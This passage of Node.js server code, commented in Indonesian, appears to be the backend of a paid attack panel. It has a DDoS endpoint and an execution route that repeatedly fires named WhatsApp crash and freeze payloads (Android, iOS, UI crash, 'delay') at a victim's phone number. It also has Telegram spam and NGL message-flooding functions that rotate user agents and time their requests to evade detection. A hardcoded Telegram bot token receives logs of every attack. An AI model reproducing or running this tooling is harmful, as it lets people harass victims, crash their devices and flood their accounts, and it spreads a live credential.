itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "8206312424:AAHl27WHQUkNdl2IUw5hb9npkTNPDEjyhcQ";
const CHAT_ID = "5738738990";
// simpan waktu terakhir eksekusi (global cooldown)
let lastExecution = 0;

app.post("/ddos", requireAuth, async (req, res) => {
  const { target, time, metode } = req.body;
  const username = req.cookies.sessionUser;

  if (!target || !time || !metode) {
    return res.status(400).json({ status: false, message: "Please fill all fields!" });
  }

  const logMessage = `<blockquote>⚔️ <b>New DDoS Attack Launched</b>
      
👤 User: ${username}
🎯 Target: ${target}
⚙️ Method: ${metode}
⏱️ Time: ${time} seconds
⏰ Timestamp: ${new Date().toLocaleString("id-ID")}</blockquote>`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: logMessage,
      parse_mode: "HTML"
    });
  } catch (err) {
    console.error("Gagal kirim log Telegram:", err.message);
  }

  res.json({
    status: true,
    message: `Attack sent to ${target} using ${metode}`
  });
});

// INI JANGAN DI APA APAIN
app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;

    // Jika tidak ada username, redirect ke login
    if (!username) {
      return res.redirect("/login?msg=Silakan login terlebih dahulu");
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.redirect("/login?msg=Session expired, login ulang");
    }

    // Handle parameter dengan lebih baik
    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target || '';
    const mode = req.query.mode || '';

    // Jika justExecuted=true, tampilkan halaman sukses
    if (justExecuted && targetNumber && mode) {
      const cleanTarget = targetNumber.replace(/\D/g, '');
      const country = getCountryCode(cleanTarget);

      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed - ${country}`
      }, false, currentUser, "", mode));
    }

    // Ambil session user yang aktif
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    console.log(`[INFO] User ${username} has ${activeUserSenders.length} active senders`);

    // Tampilkan halaman execution normal
    return res.send(executionPage("🟥 Ready", {
      message: "Masukkan nomor target dan pilih mode bug",
      activeSenders: activeUserSenders
    }, true, currentUser, "", mode));

  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

// INI BUAT PANGILAN KE FUNGSINYA
app.post("/execution", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { target, mode } = req.body;

    if (!target || !mode) {
      console.log(`[EXECUTION FAILED] Missing target or mode. Target: ${target}, Mode: ${mode}`);
      return res.status(400).json({
        success: false,
        error: "Target dan mode harus diisi"
      });
    }

    // Validasi format nomor internasional
    const cleanTarget = target.replace(/\D/g, '');

    // Validasi panjang nomor
    if (cleanTarget.length < 7 || cleanTarget.length > 15) {
      console.log(`[EXECUTION FAILED] Invalid number length: ${cleanTarget.length}`);
      return res.status(400).json({
        success: false,
        error: "Panjang nomor harus antara 7-15 digit"
      });
    }

    // Validasi tidak boleh diawali 0
    if (cleanTarget.startsWith('0')) {
      console.log(`[EXECUTION FAILED] Number starts with 0: ${cleanTarget}`);
      return res.status(400).json({
        success: false,
        error: "Nomor tidak boleh diawali dengan 0. Gunakan format kode negara (contoh: 62, 1, 44, dll.)"
      });
    }

    // Cek session user
    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    if (activeUserSenders.length === 0) {
      console.log(`[EXECUTION FAILED] No active sender for user ${username}`);
      return res.status(400).json({
        success: false,
        error: "Tidak ada sender aktif. Silakan tambahkan sender terlebih dahulu."
      });
    }

    // Validasi mode bug
    const validModes = [
  "delay",
  "crash",
  "fcandro",
  "blank-ios",
  "fcinvsios",
  "force-close",
  "delayv2",
  "stuck",
  "SqL-Exception",
  "Neural-Hardcore",
  "Trash-IOS",
  "combo",
  "CrashUi",
  "blank-iphone",
  "delay-tredict",
  "carousel-crash",
  "delay-xa",
  "delay-vamp",
  "spack-freeze",
  "verload-fc",
  "invisible-spam",
  "delay-5gb",
  "crash-beta",
  "ivs-null",
  "cosmo-uifc"
];
    if (!validModes.includes(mode)) {
      console.log(`[EXECUTION FAILED] Invalid mode: ${mode}`);
      return res.status(400).json({
        success: false,
        error: `Mode '${mode}' tidak valid. Mode yang tersedia: ${validModes.join(', ')}`
      });
    }

    // Eksekusi bug
    const userSender = activeUserSenders[0];
    const sock = sessions.get(userSender);

    if (!sock) {
      return res.status(400).json({
        success: false,
        error: "Sender tidak aktif. Silakan periksa koneksi sender."
      });
    }

    const targetJid = `${cleanTarget}@s.whatsapp.net`;
    const country = getCountryCode(cleanTarget);

    // HATI² HARUS FOKUS KALO MAU GANTI NAMA FUNGSI NYA
    let bugResult;
    try {
      if (mode === "delay") {
        for (let i = 0; i < 10; i++) {
        bugResult = await delayinvisible(sock, 24, targetJid);
        }
      } else if (mode === "crash") {
        for (let i = 0; i < 10; i++) {
        bugResult = await forceandro(sock, targetJid);
        }
      } else if (mode === "fcandro") {
        for (let i = 0; i < 10; i++) {
        bugResult = await androkill(sock, targetJid);
        }
      } else if (mode === "blank-ios") {
        for (let i = 0; i < 10; i++) {
        bugResult = await blankios(sock, targetJid);
        }
      } else if (mode === "fcinvsios") {
        for (let i = 0; i < 10; i++) {
        bugResult = await fcios(sock, targetJid);
        }
      } else if (mode === "force-close") {
        for (let i = 0; i < 10; i++) {
        bugResult = await forklos(sock, targetJid);
        }
      } else if (mode === "delayv2") {
        for (let i = 0; i < 10; i++) {
        bugResult = await hamzdelayhard(sock, 10, targetJid);
        }
      } else if (mode === "stuck") {
        for (let i = 0; i < 10; i++) {
        bugResult = await hamzblank(sock, 65, targetJid);
        }
      } else if (mode === "combo") {
        for (let i = 0; i < 10; i++) {
        await androkill(sock, targetJid);
        await sleep(1000);
        await forklos(sock, targetJid);
        await sleep(1000);
        await CrashBeta(sock, targetJid);
        await sleep(1000);
        await VampSuperDelay(sock, targetJid);
        }
        bugResult = { success: true };

      } else if (mode === "Trash-IOS") {
        for (let i = 0; i < 10; i++) {
        bugResult = await TrashLocIOS(sock, targetJid);
      }
      } else if (mode === "Neural-Hardcore") {
        for (let i = 0; i < 3; i++) {
        bugResult = await XiosVirus(sock, targetJid);
        }
      } else if (mode === "SqL-Exception") {
        for (let i = 0; i < 10; i++) {
        await SqLException(sock, targetJid);
        await nasgor(sock, targetJid);
        await iosOver(sock, 34, targetJid);
        }
        bugResult = { success: true };

      } else if (mode === "CrashUi") {
        for (let i = 0; i < 10; i++) {
        await CrashUi(sock, targetJid);
        await CrashUi(sock, targetJid);
        await hamzblank(sock, 65, targetJid);
        await hamzblank(sock, 65, targetJid);
        await androkill(sock, targetJid);
        await androkill(sock, targetJid);
        await forceandro(sock, targetJid);
        await CosmoPrivUiXFC(sock, targetJid);
        await CosmoPrivUiXFC(sock, targetJid);
        await CosmoPrivUiXFC(sock, targetJid);
        await CosmoPrivUiXFC(sock, targetJid);
        await forceandro(sock, targetJid);
      }
        bugResult = { success: true };

      } else if (mode === "blank-iphone") {
        for (let i = 0; i < 10; i++) {
        await VampireBlankIphone(sock,targetJid);
        await VampireBlankIphone(sock,targetJid);
        await VampireBlankIphone(sock,targetJid);
        }
        bugResult = { success: true };

      } else if (mode === "delay-tredict") {
        for (let i = 0; i < 10; i++) {
        await TredictDelay(sock, targetJid);
        await TredictDelay(sock, targetJid);
        await TredictDelay(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await VampSuperDelay(sock, targetJid, true);
        }
        bugResult = { success: true };

      } else if (mode === "carousel-crash") {
        for (let i = 0; i < 10; i++) {
        bugResult = await CardsCarousel(sock, targetJid);
        bugResult = await CardsCarousel(sock, targetJid);
        bugResult = await CardsCarousel(sock, targetJid);
        bugResult = await CardsCarousel(sock, targetJid);
        bugResult = await CardsCarousel(sock, targetJid);
        bugResult = await CardsCarousel(sock, targetJid);
        bugResult = await CardsCarousel(sock, targetJid);
        bugResult = await CardsCarousel(sock, targetJid);
        bugResult = await CardsCarousel(sock, targetJid);
        }
      } else if (mode === "delay-xa") {
        for (let i = 0; i < 10; i++) {
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await TredictDelay(sock, targetJid);
        await TredictDelay(sock, targetJid);
        await TredictDelay(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await VampSuperDelay(sock, targetJid, true);
        }
        bugResult = { success: true };

      } else if (mode === "delay-vamp") {
        for (let i = 0; i < 10; i++) {
        await VampSuperDelay(sock, targetJid, true);
        await VampSuperDelay(sock, targetJid, true);
        await VampSuperDelay(sock, targetJid, true);
        await VampSuperDelay(sock, targetJid, true);
        await VampSuperDelay(sock, targetJid, true);
        await TredictDelay(sock, targetJid);
        await TredictDelay(sock, targetJid);
        await TredictDelay(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await XaDelayMaker(sock, targetJid);
        await VampSuperDelay(sock, targetJid, true);
        }
        bugResult = { success: true };

      } else if (mode === "spack-freeze") {
        for (let i = 0; i < 10; i++) {
        await spacksfreeze(sock, targetJid);
        await VampireBlankIphone(sock,targetJid);
        await VampireBlankIphone(sock,targetJid);
        await VampireBlankIphone(sock,targetJid);
        await CrashUi(sock, targetJid);
        await CrashUi(sock, targetJid);
        await hamzblank(sock, 65, targetJid);
        await hamzblank(sock, 65, targetJid);
        await androkill(sock, targetJid);
        await androkill(sock, targetJid);
        await forceandro(sock, targetJid);
        await forceandro(sock, targetJid);
        await forceandro(sock, targetJid);
        await CosmoPrivUiXFC(sock, targetJid);
        await CosmoPrivUiXFC(sock, targetJid);
        await CosmoPrivUiXFC(sock, targetJid);
        }
        bugResult = { success: true };
      } else if (mode === "verload-fc") {
        for (let i = 0; i < 10; i++) {
        await VerloadXDelayFc(sock, targetJid);
        await VerloadXDelayFc(sock, targetJid);
        await VerloadXDelayFc(sock, targetJid);
        await VerloadXDelayFc(sock, targetJid);
        await VerloadXDelayFc(sock, targetJid);
        await delay5GB(sock, targetJid, true);
        await delay5GB(sock, targetJid, true);
        await delay5GB(sock, targetJid, true);
        await delay5GB(sock, targetJid, true);
        await delay5GB(sock, targetJid, true);
        await invisibleSpam(sock, targetJid);
        await invisibleSpam(sock, targetJid);
        await invisibleSpam(sock, targetJid);
        await invisibleSpam(sock, targetJid);
        await invisibleSpam(sock, targetJid);
        await CrashBeta(sock, targetJid);
        await CrashBeta(sock, targetJid);
        await CrashBeta(sock, targetJid);
        await CrashBeta(sock, targetJid);
        await CrashBeta(sock, targetJid);
        }
        bugResult = { success: true };

      } else if (mode === "invisible-spam") {
        for (let i = 0; i < 10; i++) {
        await invisibleSpam(sock, targetJid);
        await invisibleSpam(sock, targetJid);
        await invisibleSpam(sock, targetJid);
        await invisibleSpam(sock, targetJid);
        await invisibleSpam(sock, targetJid);
        }
        bugResult = { success: true };

      } else if (mode === "delay-5gb") {
        for (let i = 0; i < 10; i++) {
        await delay5GB(sock, targetJid, true);
        }
        bugResult = { success: true };

      } else if (mode === "crash-beta") {
        for (let i = 0; i < 10; i++) {
        await CrashBeta(sock, targetJid);
        }
        bugResult = { success: true };

      } else if (mode === "ivs-null") {
        for (let i = 0; i < 10; i++) {
        await IvsNull(sock, targetJid);
        }
        bugResult = { success: true };

      } else if (mode === "cosmo-uifc") {
          for (let i = 0; i < 10; i++) {
        await CosmoPrivUiXFC(sock, targetJid);
          }
        bugResult = { success: true };

      } else if (mode === "fcbos") {
        for (let i = 0; i < 10; i++) {
        await FcOneMsg(sock, targetJid);
        await FcOneMsg(sock, targetJid);
        await FcOneMsg(sock, targetJid);
        await FcOneMsg(sock, targetJid);
        }
        bugResult = { success: true };

      }

      // Kirim log ke Telegram
      const logMessage = `<blockquote>⚡ <b>New Execution Success - International</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget} (${country})
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      // Update global cooldown
      lastExecution = Date.now();

      res.json({
        success: true,
        message: "Bug berhasil dikirim!",
        target: cleanTarget,
        mode: mode,
        country: country
      });

    } catch (error) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, error.message);
      res.status(500).json({
        success: false,
        error: `Gagal mengeksekusi bug: ${error.message}`
      });
    }

  } catch (error) {
    console.error("❌ Error in POST /execution:", error);
    res.status(500).json({
      success: false,
      error: "Terjadi kesalahan internal server"
    });
  }
});

// Route untuk serve HTML Telegram Spam
app.get('/spam', (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) {
    return res.redirect('/login');
  }
  res.sendFile(path.join(__dirname, 'Miyako', 'telegram-spam.html'));
});

// API endpoint untuk spam Telegram
app.post('/api/telegram-spam', async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    if (!username) {
      return res.json({ success: false, error: 'Unauthorized' });
    }

    const { token, chatId, count, delay, mode } = req.body;

    if (!token || !chatId || !count || !delay || !mode) {
      return res.json({ success: false, error: 'Missing parameters' });
    }

    // Validasi input
    if (count > 1000) {
      return res.json({ success: false, error: 'Maximum count is 1000' });
    }

    if (delay < 100) {
      return res.json({ success: false, error: 'Minimum delay is 100ms' });
    }

    // Protected targets - tidak boleh diserang
    const protectedTargets = ['@AiiSigma', '7250235697'];
    if (protectedTargets.includes(chatId)) {
      return res.json({ success: false, error: 'Protected target cannot be attacked' });
    }

    // Kirim log ke Telegram owner
    const logMessage = `<blockquote>🔰 <b>New Telegram Spam Attack</b>
        
👤 User: ${username}
🎯 Target: ${chatId}
📱 Mode: ${mode.toUpperCase()}
🔢 Count: ${count}
⏰ Delay: ${delay}ms
🕐 Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

    try {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      });
    } catch (err) {
      console.error("Gagal kirim log Telegram:", err.message);
    }

    // Return success untuk trigger frontend
    res.json({
      success: true,
      message: 'Attack started successfully',
      attackId: Date.now().toString()
    });

  } catch (error) {
    console.error('Telegram spam error:', error);
    res.json({ success: false, error: 'Internal server error' });
  }
});

app.get("/api/confess-logs", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const data = loadConfessData();
  const userLogs = {};

  Object.keys(data).forEach(key => {
    if (data[key].username === username) {
      userLogs[key] = data[key];
    }
  });

  res.json({ success: true, logs: userLogs });
});

app.post("/api/send-confess", requireAuth, async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { target, message } = req.body;

    if (!target || !message) {
      return res.status(400).json({ success: false, error: "Nomor tujuan dan pesan harus diisi." });
    }

    const cleanTarget = target.replace(/\D/g, '');
    if (cleanTarget.length < 7 || cleanTarget.length > 15) {
      return res.status(400).json({ success: false, error: "Format nomor tidak valid." });
    }

    const userSessions = loadUserSessions();
    const userSenders = userSessions[username] || [];
    const activeUserSenders = userSenders.filter(sender => sessions.has(sender));

    if (activeUserSenders.length === 0) {
      return res.status(400).json({ success: false, error: "Tidak ada sender aktif. Silakan tambahkan sender." });
    }

    const userSender = activeUserSenders[0]; // Use the first active sender
    const sock = sessions.get(userSender);

    if (!sock) {
      return res.status(400).json({ success: false, error: "Sender tidak aktif." });
    }

    const targetJid = `${cleanTarget}@s.whatsapp.net`;

    // Format pesan confess yang lebih menarik
    const formattedMessage = `*💌 MENFESS MESSAGE 💌*

_Seseorang mengirim pesan rahasia untukmu!_

------------------------------------------------
"${message}"
*_from neural protocol_*
------------------------------------------------`;

    await sock.sendMessage(targetJid, { text: formattedMessage });

    // Simpan ke database confess
    const confessData = loadConfessData();
    const key = `${userSender}-${cleanTarget}`;

    if (!confessData[key]) {
      confessData[key] = {
        username,
        senderNumber: userSender,
        target: cleanTarget,
        messages: []
      };
    }

    confessData[key].messages.push({
      from: "me",
      text: message,
      timestamp: Date.now()
    });

    saveConfessData(confessData);

    // Kirim log ke Telegram
    const logMessage = `<blockquote>💌 <b>New Confess Message Sent</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget}
💬 Message: ${message.substring(0, 100)}...
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: logMessage,
      parse_mode: "HTML"
    }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

    res.json({ success: true, message: "Pesan confess berhasil dikirim!" });

  } catch (error) {
    console.error(`[CONFESS ERROR] User: ${req.cookies.sessionUser} | Error:`, error.message);
    res.status(500).json({ success: false, error: `Gagal mengirim pesan: ${error.message}` });
  }
});

// Endpoint buat nerima reaction
app.post('/api/add-reaction', async (req, res) => {
  try {
    const { target, messageIndex, messageId, emoji, timestamp } = req.body;

    // Kirim notif ke target via WA atau platform lain
    // Format: "Someone reacted {emoji} to your message"
    const reactionMessage = `🔔 Someone reacted ${emoji} to your message!`;

    await sendToTarget(target, reactionMessage);

    // Save reaction ke database
    await saveReaction({
      target,
      messageIndex,
      messageId,
      emoji,
      timestamp: Date.now()
    });

    res.json({ success: true });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

// ============================================
const userTracking = {
  requests: new Map(), // Track per user
  targets: new Map(),  // Track per target

  // Reset otomatis tiap 24 jam
  resetDaily() {
    this.requests.clear();
    this.targets.clear();
    console.log('🔄 Daily tracking reset');
  },

  // Cek apakah user sudah melebihi limit harian
  canUserSend(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    return current + count;
  },

  // Cek apakah target sudah melebihi limit harian
  canTargetReceive(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    return current + count;
  },

  // Update counter setelah berhasil kirim
  updateUser(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    this.requests.set(key, current + count);
  },

  updateTarget(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    this.targets.set(key, current + count);
  },

  // Lihat statistik user
  getUserStats(userId) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    return this.requests.get(key) || 0;
  },

  // Lihat statistik target
  getTargetStats(target) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    return this.targets.get(key) || 0;
  }
};

// Auto-reset setiap 24 jam (midnight)
setInterval(() => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    userTracking.resetDaily();
  }
}, 60000); // Cek tiap 1 menit

// ============================================
// FUNGSI NGL SPAM - UPDATED
// ============================================
async function nglSpam(target, message, count) {
  const logs = [];
  let success = 0;
  let errors = 0;

  console.log(`🔍 Starting NGL spam to ${target}, message: ${message}, count: ${count}`);

  const sendNGLMessage = async (target, message, attempt) => {
    // Enhanced form data dengan field tambahan
    const formData = new URLSearchParams();
    formData.append('username', target);
    formData.append('question', message);
    formData.append('deviceId', generateEnhancedUUID());
    formData.append('gameSlug', '');
    formData.append('referrer', '');
    formData.append('timestamp', Date.now().toString());

    // Random delay yang lebih realistis
    if (attempt > 1) {
      const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2-6 detik
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    // Enhanced user agents
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    ];

    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    try {
      console.log(`🔍 Attempt ${attempt} to ${target}`);

      const response = await axios.post('https://ngl.link/api/submit', formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': randomUserAgent,
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Origin': 'https://ngl.link',
          'Referer': `https://ngl.link/${target}`,
          'X-Requested-With': 'XMLHttpRequest',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin'
        },
        timeout: 15000,
        validateStatus: function (status) {
          return status >= 200 && status < 500; // Terima semua status kecuali server errors
        }
      });

      console.log(`🔍 Response status: ${response.status}, data:`, response.data);

      // Enhanced response handling
      if (response.status === 200) {
        if (response.data && response.data.success !== false) {
          success++;
          logs.push(`[${attempt}/${count}] ✅ Berhasil dikirim ke ${target}`);
          return true;
        } else {
          errors++;
          logs.push(`[${attempt}/${count}] ⚠️ Response tidak valid: ${JSON.stringify(response.data)}`);
          return false;
        }
      } else if (response.status === 429) {
        errors++;
        logs.push(`[${attempt}/${count}] 🚫 Rate limited - tunggu beberapa saat`);
        // Tunggu lebih lama jika rate limited
        await new Promise(resolve => setTimeout(resolve, 10000));
        return false;
      } else {
        errors++;
        logs.push(`[${attempt}/${count}] ❌ HTTP ${response.status}: ${response.statusText}`);
        return false;
      }
    } catch (error) {
      errors++;
      console.error(`🔍 Error in attempt ${attempt}:`, error.message);

      if (error.response) {
        logs.push(`[${attempt}/${count}] ❌ HTTP ${error.response.status}: ${error.response.data?.message || error.response.statusText}`);
      } else if (error.request) {
        logs.push(`[${attempt}/${count}] ❌ Network Error: Tidak dapat terhubung ke server NGL`);
      } else {
        logs.push(`[${attempt}/${count}] ❌ Error: ${error.message}`);
      }

      return false;
    }
  };

  // Enhanced UUID generator
  function generateEnhancedUUID() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 9);
    return `web-${timestamp}-${random}`;
  }

  // Validasi input
  if (!target || !message || count <= 0) {
    throw new Error('Input tidak valid');
  }

  if (count > 50) { // Kurangi limit untuk menghindari detection
    throw new Error('Maksimal 50 pesan per request untuk menghindari detection');
  }

  // Jalankan spam
  logs.push(`🚀 Memulai spam ke: ${target}`);
  logs.push(`📝 Pesan: ${message}`);
  logs.push(`🔢 Jumlah: ${count} pesan`);
  logs.push(`⏳ Delay: 2-6 detik random antar pesan`);
  logs.push(`─`.repeat(40));

  for (let i = 0; i < count; i++) {
    const result = await sendNGLMessage(target, message, i + 1);

    // Jika rate limited, berhenti sementara
    if (i > 0 && i % 10 === 0) {
      logs.push(`⏸️  Istirahat sebentar setelah ${i} pesan...`);
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  logs.push(`─`.repeat(40));
  logs.push(`📊 SELESAI! Sukses: ${success}, Gagal: ${errors}`);

  return { success, errors, logs };
}

// Helper function untuk generate UUID
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ============================================
// ROUTE NGL SPAM WEB - UPDATED dengan Info Limit
// ============================================

// ==================== NGL SPAM ROUTE ==================== //
app.get("/ngl-spam", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  const formattedExp = currentUser ? new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta"
  }) : "-";

  const userId = req.ip || req.headers['x-forwarded-for'] || username;
  const userUsageToday = userTracking.getUserStats(userId);
  const remainingUser = 200 - userUsageToday;
  const usagePercentage = (userUsageToday / 200) * 100;

  // Load template dari file terpisah
  const filePath = path.join(__dirname, "Miyako", "spam-ngl.html");

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file spam-ngl.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }

    // Replace variables dengan data REAL dari sistem
    let finalHtml = html
      .replace(/\${username}/g, username)
      .replace(/\${formattedExp}/g, formattedExp)
      .replace(/\${userUsageToday}/g, userUsageToday)
      .replace(/\${remainingUser}/g, remainingUser)
      .replace(/\${usagePercentage}/g, usagePercentage);

    res.send(finalHtml);
  });
});

// ============================================
// API ENDPOINT - UPDATED dengan Tracking System
// ============================================
app.get("/api/ngl-stats", requireAuth, (req, res) => {
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';

  res.json({
    userStats: {
      todayUsage: userTracking.getUserStats(userId),
      dailyLimit: 200,
      remaining: 200 - userTracking.getUserStats(userId)
    },
    resetTime: 'Midnight (00:00 WIB)',
    message: 'Statistik penggunaan hari ini'
  });
});

// ✨ BONUS: Endpoint untuk cek target
app.get("/api/ngl-target-stats/:target", requireAuth, (req, res) => {
  const { target } = req.params;

  res.json({
    target: target,
    todayReceived: userTracking.getTargetStats(target),
    dailyLimit: 100,
    remaining: 100 - userTracking.getTargetStats(target),
    resetTime: 'Midnight (00:00 WIB)'
  });
});

app.post("/api/ngl-spam-js", requireAuth, async (req, res) => {
  const { target, message, count } = req.body;

  // Ambil user ID dari IP atau cookie
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';

  // Hard limits
  const limits = {
    maxPerRequest: 100,      // Max 100 pesan per request
    minDelay: 3000,          // Minimal delay 3 detik
    maxDailyPerUser: 200,    // Max 200 pesan per user per hari
    maxDailyPerTarget: 100   // Max 100 pesan ke target yang sama
  };

  if (!target || !message || !count) {
    return res.status(400).json({ error: "Semua field harus diisi" });
  }

  // ✅ VALIDASI 1: Cek count tidak melebihi maxPerRequest
  if (count > limits.maxPerRequest) {
    return res.status(400).json({
      error: `❌ Untuk keamanan, maksimal ${limits.maxPerRequest} pesan per request`,
      currentCount: count,
      maxAllowed: limits.maxPerRequest
    });
  }

  if (count < 1) {
    return res.status(400).json({
      error: '❌ Jumlah pesan harus minimal 1'
    });
  }

  // ✅ VALIDASI 2: Cek limit harian user
  const userTotal = userTracking.canUserSend(userId, count);
  if (userTotal > limits.maxDailyPerUser) {
    const currentUsage = userTracking.getUserStats(userId);
    return res.status(429).json({
      error: '🚫 Limit harian tercapai!',
      message: `Kamu sudah kirim ${currentUsage} pesan hari ini. Limit: ${limits.maxDailyPerUser}/hari`,
      currentUsage: currentUsage,
      dailyLimit: limits.maxDailyPerUser,
      remaining: limits.maxDailyPerUser - currentUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  // ✅ VALIDASI 3: Cek limit harian target
  const targetTotal = userTracking.canTargetReceive(target, count);
  if (targetTotal > limits.maxDailyPerTarget) {
    const currentTargetUsage = userTracking.getTargetStats(target);
    return res.status(429).json({
      error: '🚫 Target sudah menerima terlalu banyak pesan!',
      message: `Target ${target} sudah terima ${currentTargetUsage} pesan hari ini. Limit: ${limits.maxDailyPerTarget}/hari`,
      currentTargetUsage: currentTargetUsage,
      targetDailyLimit: limits.maxDailyPerTarget,
      remaining: limits.maxDailyPerTarget - currentTargetUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  try {
    // Kirim pesan
    const result = await nglSpam(target, message, parseInt(count));

    // ✅ UPDATE TRACKING setelah berhasil
    userTracking.updateUser(userId, result.success);
    userTracking.updateTarget(target, result.success);

    // Kirim response dengan statistik
    res.json({
      ...result,
      stats: {
        userToday: userTracking.getUserStats(userId),
        userLimit: limits.maxDailyPerUser,
        targetToday: userTracking.getTargetStats(target),
        targetLimit: limits.maxDailyPerTarget,
        remaining: {
          user: limits.maxDailyPerUser - userTracking.getUserStats(userId),
          target: limits.maxDailyPerTarget - userTracking.getTargetStats(target)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Route untuk TikTok (HANYA bisa diakses setelah login)
app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// Route untuk halaman My Senders
app.get("/my-senders", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
